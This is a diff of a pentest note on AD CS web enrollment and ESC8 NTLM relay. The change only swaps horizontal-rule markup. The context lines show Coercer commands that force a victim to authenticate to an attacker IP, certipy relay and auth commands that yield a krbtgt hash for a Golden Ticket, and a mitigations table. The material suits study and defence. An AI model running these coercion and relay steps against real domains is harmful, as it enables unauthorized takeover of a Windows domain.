@@ -18,7 +18,7 @@ linked:
 ---
 # AD - ADCS Enumeration - Web Enrollment & Relay
 
-***
+---
 
 ## Web Enrollment Endpoints
 
@@ -40,7 +40,7 @@ for url in "/certsrv/" "/certsrv/certfnsh.asp" "/certsrv/certrqxt.asp" "/certsrv
 done
 ```
 
-___
+---
 
 ## ESC8 (NTLM Relay)
 
@@ -68,7 +68,7 @@ certipy auth -pfx dc01.pfx -dc-ip <DC>
 # Output: NT hash krbtgt → Golden Ticket
 ```
 
-___
+---
 
 ## NDES (SCEP) Endpoint
 
@@ -79,7 +79,7 @@ ___
 | Pre-shared challenge phrase abuse | Static challenge → mass enrollment | Edge. |
 ^ad-webenroll-ndes
 
-___
+---
 
 ## Channel Binding (EPA)
 
@@ -92,7 +92,7 @@ ___
 
 **Por qué importa:** EPA (Extended Protection for Authentication) **bloquea NTLM relay** sobre HTTPS. Si el CA tiene HTTPS + EPA Required = ESC8 mitigado. Hardening recomendado.
 
-___
+---
 
 ## SMB Signing Cross-Correlate
 
@@ -104,7 +104,7 @@ ___
 
 **Note:** ESC8 specific es HTTP relay → CA. SMB signing del CA no afecta. Pero si querés relay desde SMB → HTTP, el source SMB necesita ser unsigned.
 
-___
+---
 
 ## Coercion Sources
 
@@ -125,7 +125,7 @@ python3 Coercer.py scan -t <victim> -u corp/u -p pass
 python3 Coercer.py coerce -t <victim> -l <attacker-IP> -u corp/u -p pass -d corp.local
 ```
 
-___
+---
 
 ## Modern certipy Relay
 
@@ -141,7 +141,7 @@ certipy relay -target http://<CA-host> -ca <CA-name> -template DomainController
 # Coerce desde otra terminal → certipy auto-receives + emits cert
 ```
 
-___
+---
 
 ## Mitigations
 
@@ -157,4 +157,4 @@ ___
 | `RestrictNTLM` GPO | Block NTLM auth en DC entirely | Aggressive hardening. |
 ^ad-webenroll-mitigations
 
-***
+---
